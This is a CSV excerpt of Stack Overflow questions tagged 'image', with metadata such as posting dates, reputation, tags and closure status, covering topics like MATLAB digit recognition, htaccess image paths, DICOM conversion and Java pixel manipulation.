PostId,PostCreationDate,OwnerUserId,OwnerCreationDate,ReputationAtPostCreation,OwnerUndeletedAnswerCountAtPostTime,Title,BodyMarkdown,Tag1,Tag2,Tag3,Tag4,Tag5,PostClosedDate,OpenStatus,OpenStatusInt,BodyLength,TitleLength,TitleConcatWithBody,NumberOfTags
5054077,02/19/2011 22:59:06,624806,02/19/2011 22:59:06,1,0,How to recognize numbers using webcam?,"I am doing my masters project on image processing. And I got stuck inbetween. I want to recognize the numbers from the webcam image. So far I am able to take images. Also I can store and retrieve it in '.jpg' format. (You can suggest me to switch to other format too if necessary). Then I am trying to subtract 2 images using mask on the sides. But some how I figure it out this is not the efficient way to do it. I am naive in this part of the world of MATLAB. Can you please guide me?
Thank you very much!",image,matlab,processing,,,09/15/2011 05:43:36,not a real question,1,102,6,"How to recognize numbers using webcam? I am doing my masters project on image processing. And I got stuck inbetween. I want to recognize the numbers from the webcam image. So far I am able to take images. Also I can store and retrieve it in '.jpg' format. (You can suggest me to switch to other format too if necessary). Then I am trying to subtract 2 images using mask on the sides. But some how I figure it out this is not the efficient way to do it. I am naive in this part of the world of MATLAB. Can you please guide me?
Thank you very much!",3
10835626,05/31/2012 14:29:20,1428630,05/31/2012 14:20:37,1,0,mediaelement.js video and poster image offset position,"Just installed MediaElement.js and didn't find anything on this topic:
My poster images all are in an offset position from the player. This results in a ""ghostery appearence"" of the image (double display).
Better have a look for yourself:
[enter link description here][1]

How can I get them on the same position?
Why are they actually offset?

PS: Used ""Degradable HTML5 audio and video"" before and this did not occur...


  [1]: http://www.gido-griese.de/portfolio/imagefilm/",image,position,offset,mediaelement.js,,,open,0,67,7,"mediaelement.js video and poster image offset position Just installed MediaElement.js and didn't find anything on this topic:
My poster images all are in an offset position from the player. This results in a ""ghostery appearence"" of the image (double display).
Better have a look for yourself:
[enter link description here][1]

How can I get them on the same position?
Why are they actually offset?

PS: Used ""Degradable HTML5 audio and video"" before and this did not occur...


  [1]: http://www.gido-griese.de/portfolio/imagefilm/",4
10043253,04/06/2012 12:04:50,1317376,04/06/2012 11:52:43,1,0,How can I rewrite image path via htaccess?,"I have to website e.g.,

www.example1.com
www.example2.com

example1 is already up and has all the images I need to put in my example2 website.

i want to get all images from example1 to put in my example2 website e.g.,

www.example1.com/media/img/image1.jpg <-- get this image and put in
www.example1.com/media/img/image2.jpg

I want this done so that I don't have to copy all images from example1 directory to example2

Thank you all... :)",image,.htaccess,path,rewrite,,,open,0,62,8,"How can I rewrite image path via htaccess? I have to website e.g.,

www.example1.com
www.example2.com

example1 is already up and has all the images I need to put in my example2 website.

i want to get all images from example1 to put in my example2 website e.g.,

www.example1.com/media/img/image1.jpg <-- get this image and put in
www.example1.com/media/img/image2.jpg

I want this done so that I don't have to copy all images from example1 directory to example2

Thank you all... :)",4
11570368,07/19/2012 22:40:37,1480899,06/25/2012 19:26:46,58,1,Access 2010 Query results with image next to it,"I have a query that returns a list of items. What I would like is to be able to display this on a form with an image (green/red circle) to indicate if the item is working or not. I'm not sure this is possible but if it is I would appreciate a pointer.
  

Example of form:
  

(Green) Truck1  
(Green) Truck2  
(Red) Truck3  
(Red) Car1  
(Green) Car2",image,query,ms-access-2010,,,,open,0,72,9,"Access 2010 Query results with image next to it I have a query that returns a list of items. What I would like is to be able to display this on a form with an image (green/red circle) to indicate if the item is working or not. I'm not sure this is possible but if it is I would appreciate a pointer.
  

Example of form:
  

(Green) Truck1  
(Green) Truck2  
(Red) Truck3  
(Red) Car1  
(Green) Car2",3
7540575,09/24/2011 17:17:36,938221,09/10/2011 13:38:04,47,3,comparing two vector images,"I want to compare two vector images (say SVG) and see how close they are.
Basically, I want to test the correctness of a tracing algorithm which converts raster images to vector format.

The way I am thinking to test this algorithm is:

-Take some vector images.

-Rasterize the vector image to png.

-Feed the above png to tracing algorithm.

-Compare the output of tracing program (which is SVG) with the original one.

While I know there are some metrices for raster images like RMSE (in imagemagick), I am not familiar if there are some standard metrices for vector formats.
I can think of some simple ones like number of arcs, lines, curves etc. But these can not detect the deviation in geometry and colors. Could someone suggest a good standard metric or some other approach to this problem. ",image,svg,vector-graphics,,,,open,0,132,4,"comparing two vector images I want to compare two vector images (say SVG) and see how close they are.
Basically, I want to test the correctness of a tracing algorithm which converts raster images to vector format.

The way I am thinking to test this algorithm is:

-Take some vector images.

-Rasterize the vector image to png.

-Feed the above png to tracing algorithm.

-Compare the output of tracing program (which is SVG) with the original one.

While I know there are some metrices for raster images like RMSE (in imagemagick), I am not familiar if there are some standard metrices for vector formats.
I can think of some simple ones like number of arcs, lines, curves etc. But these can not detect the deviation in geometry and colors. Could someone suggest a good standard metric or some other approach to this problem. ",3
5649318,04/13/2011 12:37:36,706045,04/13/2011 12:37:36,1,0,Display Image dynamically,"I have a division in which i have display some messages coming from DB.Now In front of every message i want an image generating dynamically and it should be appending with every message depending on the no. of message coming???
",image,,,,,04/13/2011 18:35:26,not a real question,1,40,3,"Display Image dynamically I have a division in which i have display some messages coming from DB.Now In front of every message i want an image generating dynamically and it should be appending with every message depending on the no. of message coming???
",1
6729789,07/18/2011 07:24:59,849541,07/18/2011 07:24:59,1,0,Image Copy to Server Side in Class file,"I want to know ""How to copy image to Server Side Folder at Class File in C#.net"" ?
I know Source Path and Desc Path only.",image,,,,,07/18/2011 11:21:15,not a real question,1,25,8,"Image Copy to Server Side in Class file I want to know ""How to copy image to Server Side Folder at Class File in C#.net"" ?
I know Source Path and Desc Path only.",1
9637619,03/09/2012 16:33:32,1040498,11/10/2011 20:07:28,35,3,"How to convert a DICOMDIR in several "".dcm"" files?","I have a lot of folders with DICOMDIR structure, each folder have a DICOMDIR with four images. I'd like export/convert the DICOMDIR in four "".dcm"" files. How I can do it? Is possible do it programmatically? ",image,dicom,,,,03/15/2012 13:33:45,not a real question,1,37,9,"How to convert a DICOMDIR in several "".dcm"" files? I have a lot of folders with DICOMDIR structure, each folder have a DICOMDIR with four images. I'd like export/convert the DICOMDIR in four "".dcm"" files. How I can do it? Is possible do it programmatically? ",2
1965169,12/27/2009 04:31:57,239059,12/27/2009 04:31:57,1,0,Image upload problem,"When I am upload my image in local server(my pc server) then it's OK, but when it's on sever(web server) then image upload system does not work. I already change my server permission to 777

what can i do to solve this problem..........

Plz response as early as possible............",image,upload,,,,12/28/2009 01:50:52,not a real question,1,47,3,"Image upload problem When I am upload my image in local server(my pc server) then it's OK, but when it's on sever(web server) then image upload system does not work. I already change my server permission to 777

what can i do to solve this problem..........

Plz response as early as possible............",2
9502569,02/29/2012 16:08:15,1209555,02/14/2012 16:39:59,1,0,make black white picture,"i just want to make black and white image but i dont know how to do this, just knowing to get pixel
can you hep me



   
        private BufferedImage image;
        private int[][]rgbValue;  
        
       
        
        public void setRgbValue(BufferedImage image){
            int width = image.getWidth();
            int height = image.getHeight();
            
    	        rgbValue = new int[width*height][3];
    	        int counter = 0;
    	        for(int i=0 ; i<width ; i++){
    	            for(int j=0 ; j<height ; j++){
    	                int color = image.getRGB(i, j);
    	                int red = (color & 0x00ff0000) >> 16;
    	                int green = (color & 0x0000ff00) >> 8;
    	                int blue = (color & 0x000000ff);
    	                rgbValue[counter][0] = red;
    	                rgbValue[counter][1] = green;
    	                rgbValue[counter][2] = blue;
    	                counter++;           
                            }        
    	        }
",image,white,,,,,open,0,441,4,"make black white picture i just want to make black and white image but i dont know how to do this, just knowing to get pixel
can you hep me



   
        private BufferedImage image;
        private int[][]rgbValue;  
        
       
        
        public void setRgbValue(BufferedImage image){
            int width = image.getWidth();
            int height = image.getHeight();
            
    	        rgbValue = new int[width*height][3];
    	        int counter = 0;
    	        for(int i=0 ; i<width ; i++){
    	            for(int j=0 ; j<height ; j++){
    	                int color = image.getRGB(i, j);
    	                int red = (color & 0x00ff0000) >> 16;
    	                int green = (color & 0x0000ff00) >> 8;
    	                int blue = (color & 0x000000ff);
    	                rgbValue[counter][0] = red;
    	                rgbValue[counter][1] = green;
    	                rgbValue[counter][2] = blue;
    	                counter++;           
                            }        
    	        }
",2
